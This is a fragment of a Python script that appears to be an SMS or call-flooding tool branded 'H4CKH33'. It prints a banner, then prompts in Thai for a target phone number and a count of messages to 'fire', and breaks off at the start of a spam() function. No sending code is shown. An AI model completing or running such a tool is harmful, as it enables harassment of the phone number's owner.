...
time.sleep(1)
os.system("clear")
os.system("figlet -f mono12 H4CKH33 | lolcat -a")
time.sleep(1)
print("              \          /              ")
print("               \        /               ")
print("                \      /                ")
...
print("                  \  /                  ")
print("                   \/                   ")
print(" \033[32m______________________________________")
print('\033[32m|\033[34m(create By H4CKH33 and H4CK._.ST3PS!S)\033[32m|')
print("\033[32m|______________________________________|")
time.sleep(2)
print("\033[32m|\033[36m เช็คข้อมูล...                           \033[32m|")
print("\033[32m|______________________________________|")
time.sleep(2)
num = input('\033[34m(ตัวอย่างการใส่เบอร์ +6694xxxxxx)\033[31m --->\033[34m  ')
print("      ")
lim = int(input('\033[34m(ใส่จำนวนที่จะยิง)\033[31m --->\033[34m   '))
numplus = '+' + num
def spam():
        try:
